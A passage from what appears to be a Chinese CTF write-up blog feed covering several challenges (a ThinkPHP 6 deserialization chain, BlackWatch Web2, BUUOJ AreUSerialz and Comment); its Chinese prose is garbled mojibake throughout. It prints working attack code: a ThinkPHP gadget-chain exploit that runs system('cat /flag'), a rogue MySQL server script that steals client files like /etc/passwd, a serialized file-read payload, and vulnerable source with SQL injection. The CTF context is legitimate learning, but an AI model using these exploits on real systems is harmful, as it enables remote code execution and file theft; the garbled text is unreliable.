<p>é¦–å…ˆçœ‹åˆ°çš„æ˜¯index.phpï¼Œunserializeå‡½æ•°æç¤ºè¿™é“é¢˜æ˜¯ç”¨ååºåˆ—åŒ–ï¼Œè¿™è¿˜æ˜¯ç¬¬ä¸€æ¬¡ç¢°åˆ°ç›´æ¥ç»™äº†æ•´ä¸ªæ¡†æ¶æ‰¾é“¾å­çš„é¢˜ã€‚è¿™é‡Œçš„parse_urlç”¨æ¥è§£æURLï¼Œè¿”å›å…¶ç»„æˆéƒ¨åˆ†</p>
<img src="/2020/07/01/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%5D2019-iamthinking/2.png" class="">

<p>æŸ¥æ‰¾ä¸€ä¸‹èµ„æ–™å°±èƒ½æ‰¾åˆ°parase_url()å‡½æ•°çš„ç»•è¿‡æ–¹æ³•å°±æ˜¯/// ä¸‰ä¸ªæ–œæ ï¼Œå¤šè¯´æ— ç›Šï¼Œæµ‹è¯•ä¸€ä¸‹å¥½äº†</p>
<p>è¿™æ˜¯æ­£å¸¸çš„urlè§£æ</p>
<img src="/2020/07/01/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%5D2019-iamthinking/3.png" class="">

<p>è¿™æ˜¯ç»•è¿‡parase_urlä¹‹åçš„ï¼Œçœ‹èµ·æ¥parse_urlè¿˜æ˜¯è¿›è¡Œäº†è§£æï¼Œå®é™…ä¸Šåº”è¯¥è¿”å›false</p>
<img src="/2020/07/01/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%5D2019-iamthinking/4.png" class="">

<p>thinkphp v6.0.x ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼š<a href="https://www.anquanke.com/post/id/187393#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187393#h2-1</a></p>
<p>è¿™ç¯‡æ–‡ç« è®²çš„å¾ˆè¯¦ç»†ï¼Œå¯ä»¥è‡ªå·±è·Ÿç€æ­¥éª¤æ‰¾ä¸€ä¸‹é“¾å­ï¼Œæ–‡ç« æœ«å°¾æœ‰expé›†æˆçš„å·¥å…·é“¾æ¥</p>
<p>ä¸‹é¢æ˜¯åˆ«çš„å¸ˆå‚…çš„expï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line">        <span class="keyword">private</span> $withAttr = [<span class="string">"xxx"</span> =&gt; <span class="string">"system"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">"xxx"</span> =&gt; <span class="string">"cat /flag"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">private</span> $lazySave;</span><br><span class="line">        <span class="keyword">protected</span> $withEvent;</span><br><span class="line">        <span class="keyword">private</span> $exists;</span><br><span class="line">        <span class="keyword">private</span> $force;</span><br><span class="line">        <span class="keyword">protected</span> $field;</span><br><span class="line">        <span class="keyword">protected</span> $schema;</span><br><span class="line">        <span class="keyword">protected</span> $table;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;force = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;schema = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//å®šä¹‰this-&gt;dataä¸ä¸ºç©º</span></span><br><span class="line">            <span class="keyword">parent</span>::__construct();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = $obj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> Pivot();</span><br><span class="line">    $b = <span class="keyword">new</span> Pivot($a);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆåºåˆ—åŒ–æ•°æ®ä¹‹åæ‰“è¿‡å»å°±èƒ½é‚£é“flagäº†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨é‚£ä¸ªphpggcæ¥ç”Ÿæˆæ•°æ®</p>
<img src="/2020/07/01/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%5D2019-iamthinking/5.png" class="">

<p>æ‰“è¿‡å»</p>
<img src="/2020/07/01/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%5D2019-iamthinking/6.png" class="">]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>BlackWatchå…¥ç¾¤é¢˜Web2</title>
    <url>/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/</url>
    <content><![CDATA[<p>å¼€é¢˜æ˜¯è¿™æ ·çš„ä¸€ä¸ªç™»å½•ç•Œé¢<a id="more"></a></p>
<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/1.png" class="">

<p>ç™»å½•é¡µé¢è¿‡æ»¤äº†|â€™|or|and|#|ç­‰ï¼Œæ³¨å†Œç•Œé¢å¥½åƒæ²¡æœ‰è¿‡æ»¤ï¼Œè¿™é‡Œå¯ä»¥æŠ“åŒ…è¿›è¡Œæ³¨å†Œå’Œç™»å½•</p>
<p>çŒœæµ‹æŸ¥è¯¢è¯­å¥ä¸ºï¼šselect xx from xx where username=â€™$usernameâ€™ and password=â€™$passwordâ€™ xxx;é€šè¿‡åæ–œæ è½¬ä¹‰å•å¼•å·ä½¿å¾—åé¢å¾—passwordè¯­å¥èƒ½å¤Ÿé€ƒé€¸æˆåŠŸ</p>
<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/2.png" class="">

<p>æ³¨å†ŒæˆåŠŸï¼Œç„¶åç™»å½•å¾—æ—¶å€™è¦ç”¨åˆ°æ²¡æ¥è§¦è¿‡çš„çŸ¥è¯†ç‚¹with rollupï¼Œå…·ä½“ä½œç”¨å¯ä»¥å»æœç´¢ä¸€ä¸‹çœ‹çœ‹æœ‰ä»€ä¹ˆä¸ä¸€æ ·çš„ï¼Œæˆ‘çš„ç†è§£æ˜¯æŸ¥åˆ°çš„æ•°æ®ä¼šæ›´å¤šï¼Œå³ä½¿æŸä¸€åˆ—æ¡ä»¶çš„å€¼å¯èƒ½æ˜¯NULL</p>
<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/3.png" class="">

<p>ç™»å½•æˆåŠŸï¼Œæ”¾åŒ…ï¼ŒæˆåŠŸç™»å½•åˆ°äº†åå°</p>
<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/4.png" class="">

<p>åˆ°è¿™é‡Œæ€è·¯å¡ä½äº†ï¼ŒåªçŸ¥é“flagå’Œå…¥ç¾¤å¯†ç åœ¨æ ¹ç›®å½•ä¸‹é¢ï¼Œé¢˜ç›®æç¤ºäº†è¦ç”¨åˆ°å†…ç½‘é¶æœºï¼Œåº”è¯¥è¦åå¼¹shellï¼Œå¯æ˜¯è¿™é‡Œå•¥ä¿¡æ¯éƒ½æ²¡æœ‰ï¼Œå…ˆæ¥çœ‹çœ‹å·²ç»æœ‰å¾—é©¬ï¼ŒæŠ“ä¸ªåŒ…</p>
<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/5.png" class="">

<p>çœ‹åˆ°æ•°æ®ä»¥jsonå½¢å¼è¿”å›ï¼Œè¿”å›å¾—æ˜¯æ–‡ä»¶åï¼Œåˆ°è¿™é‡ŒçŒœæµ‹å¯èƒ½å¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œç‚¹åº”è¯¥åœ¨nameè¿™ï¼Œè‡ªå·±å†™ä¸€ä¸ªä¼ ä¸Šå»ï¼Œå‘ç°éƒ½ä¼šå¸¦ä¸ŠWebshellï¼Œåº”è¯¥æ˜¯è‡ªåŠ¨æ‹¼æ¥çš„ï¼Œç”¨%00æˆªæ–­</p>
<p>ç½‘é¡µæ·»åŠ ä¸ªåˆ†ç±»ï¼Œç±»åä¸ºç©¿è¶Šè·¯å¾„</p>
<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/7.png" class="">

<p>å†æŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°flagå’Œå¯†ç æ–‡ä»¶</p>
<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/6.png" class="">

<p>è¿™é‡Œåˆå‡ºç°äº†æ–°é—®é¢˜ï¼Œæ€ä¹ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¿™é¢˜çš„è€ƒé¢˜è¿˜æœ‰sqlæ³¨å…¥ï¼Œgoogleï¼Œå‘ç°äº†sqlä¼ªæœåŠ¡å™¨çš„è„šæœ¬ï¼Œé‚£å¯èƒ½å¯ä»¥ç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#mysql_server.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"/etc/passwd"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3306</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/shuteer_xu/article/details/104046895/ï¼Œè¿™ç¯‡æ–‡ç« è¿›è¡Œäº†ç›¸å…³çŸ¥è¯†ç‚¹çš„è®²è§£ï¼Œå¾ˆè¯¦ç»†ï¼Œè™½ç„¶ç”¨çš„å·¥å…·æœ‰ç‚¹åŒºåˆ«ï¼Œæ–‡ç« é‡Œçš„æ˜¯githubä¸Šé›†æˆçš„å·¥å…·" target="_blank" rel="noopener">https://blog.csdn.net/shuteer_xu/article/details/104046895/ï¼Œè¿™ç¯‡æ–‡ç« è¿›è¡Œäº†ç›¸å…³çŸ¥è¯†ç‚¹çš„è®²è§£ï¼Œå¾ˆè¯¦ç»†ï¼Œè™½ç„¶ç”¨çš„å·¥å…·æœ‰ç‚¹åŒºåˆ«ï¼Œæ–‡ç« é‡Œçš„æ˜¯githubä¸Šé›†æˆçš„å·¥å…·</a></p>
<p>åœ¨å†…ç½‘é¶æœºä¸Šå¯åŠ¨sqlæœåŠ¡ä¹‹åï¼Œç½‘å€æ•°æ®å¤‡ä»½é¡µé¢è¾“å…¥åœ°å€å’Œç«¯å£ç‚¹å‡»è¿æ¥æµ‹è¯•å°±ä¼šæœ‰æ•°æ®å¼¹å›</p>
<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/8.png" class="">

<p>è¿™é‡Œä¸é‡å¤æ“ä½œäº†ï¼Œé¶æœºè¿”å›çš„æ•°æ®å¸¦å‡ºäº†flagå’Œå…¥ç¾¤å¯†ç </p>
<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/9.png" class="">



]]></content>
      <tags>
        <tag>blackwatch</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj3</title>
    <url>/2020/05/16/buuoj3/</url>
    <content><![CDATA[<h4 id="0X01ï¼š-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#0X01ï¼š-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="0X01ï¼š[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>0X01ï¼š[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz<a id="more"></a></h4><p>è¿™é“é¢˜å½“å¤©æ¯”èµ›çš„æ—¶å€™å°±å¤§æ¦‚çœ‹äº†ä¸€ä¸‹ï¼Œç°åœ¨buuä¸Šå¤ç°äº†å‘ç°ä¹Ÿä¸æ˜¯å¾ˆéš¾ï¼Œæ¥çœ‹çœ‹å§</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–ï¼Œå¯¹ä¼ å…¥çš„strå‚æ•°è¿›è¡Œååºåˆ—åŒ–ï¼Œå­—ç¬¦çš„ASCIIéƒ½è¦åœ¨32~125ä¹‹é—´</p>
<p>ååºåˆ—åŒ–ä¼šè°ƒç”¨__destructææ„æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œ===æ˜¯å¼ºæ¯”è¾ƒï¼Œä¹Ÿå°±æ˜¯è¯´å­—ç¬¦å€¼å’Œç±»å‹éƒ½è¦ç›¸åŒï¼Œå¦‚æœä¸åŒå°±è¿›å…¥process()å‡½æ•°ä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä»è¿™å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æƒ³è¦è¯»å–æ–‡ä»¶ï¼Œé‚£ä¹ˆopçš„å€¼è¦ä¸º2ï¼Œåˆšå¥½è¿™é‡Œæ˜¯ç”¨çš„è‹¥æ¯”è¾ƒï¼Œç›´æ¥è®©op=2</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       $res = <span class="string">""</span>;</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">           $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>readå‡½æ•°ä¸­çš„filenameæ˜¯å¯æ§çš„ï¼Œèµ‹å€¼ä¸ºflag.phpï¼Œå†ä»¥outputå‡½æ•°è¾“å‡º</p>
<p>è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œprotectå¯¹è±¡åºåˆ—åŒ–æ—¶ä¼šæœ‰%00,%00å¯¹åº”çš„asciiå€¼ä¸º0ä¸åœ¨é‚£ä¸ªèŒƒå›´å†…ï¼Œæ‰¾èµ„æ–™å‘ç°php7.1å¯¹äºå±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæ”¹ä¸ºpublic</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:11:"FileHandler":3:&#123;s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç»™strä¼ å…¥åºåˆ—åŒ–æ•°æ®ï¼Œåœ¨æºç å¤„æ‰¾åˆ°flag</p>
<h4 id="0X02ï¼š-ç½‘é¼æ¯-2018-Comment"><a href="#0X02ï¼š-ç½‘é¼æ¯-2018-Comment" class="headerlink" title="0X02ï¼š[ç½‘é¼æ¯ 2018]Comment"></a>0X02ï¼š[ç½‘é¼æ¯ 2018]Comment</h4><p>æ‰“å¼€æ˜¯ä¸€ä¸ªç•™è¨€æ¿ç•Œé¢ï¼ŒF12æ‰¾åˆ°æç¤ºï¼šç¨‹åºå‘˜GITå†™ä¸€åŠè·‘è·¯äº†,éƒ½æ²¡æ¥å¾—åŠCommit :)</p>
<p>ç”¨githackæ‰¾åˆ°æ–‡ä»¶ï¼Œä½†æ˜¯åªæ˜¾ç¤ºäº†ä¸€éƒ¨åˆ†ï¼Œçœ‹äº†wpï¼Œç”¨çš„wyhå¸ˆå‚…çš„githackå¯ä»¥æ¢å¤ï¼Œæ‹¿åˆ°äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);<span class="comment">//ç¬¬ä¸€æ¬¡è¿‡æ»¤</span></span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',//æœªè¿‡æ»¤ç›´æ¥ç”¨</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

